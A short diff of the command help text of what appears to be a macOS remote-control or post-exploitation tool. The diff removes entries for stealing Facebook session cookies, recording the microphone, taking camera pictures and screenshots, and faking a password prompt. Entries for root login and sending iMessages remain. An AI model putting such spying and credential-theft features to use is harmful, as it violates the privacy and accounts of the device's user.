@@ -1,12 +1,6 @@
-download       : Download remote file.
-getfacebook    : Retrieve facebook session cookies.
 icons          : List system alert icons.
 imessage       : Send message through the messages app.
-mic            : Record mic sound.
-picture        : Take picture through iSight.
 pid            : Get MPL process ID.
-prompt         : Prompt user to type password.
-screenshot     : Take screenshot.
 sleep          : Put device into sleep mode.
 su             : Login as root.
 suspend        : Suspend current session.
